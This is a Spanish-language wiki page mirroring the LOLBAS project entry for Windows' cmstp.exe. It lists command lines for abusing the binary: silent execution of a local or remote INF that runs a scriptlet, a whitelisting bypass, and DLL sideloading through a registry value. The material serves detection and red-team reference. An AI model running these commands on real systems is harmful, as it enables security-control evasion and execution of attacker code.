# LOLBAS: Cmstp.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`, `Execute`

Installs or removes a Connection Manager service profile.

## Comandos

### Execute code hidden within an inf file. Download and run scriptlets from internet.

Execute · priv: User · T1218.003

```cmd
cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
```

Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

### Execute code hidden within an inf file. Execute code directly from Internet.

AWL Bypass · priv: User · T1218.003

```cmd
cmstp.exe /ni /s {REMOTEURL:.inf}
```

Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.

### Proxy execution of a malicious DLL via registry modification.

Execute · priv: Administrator · T1218.003

```cmd
cmstp.exe /nf
```

cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.

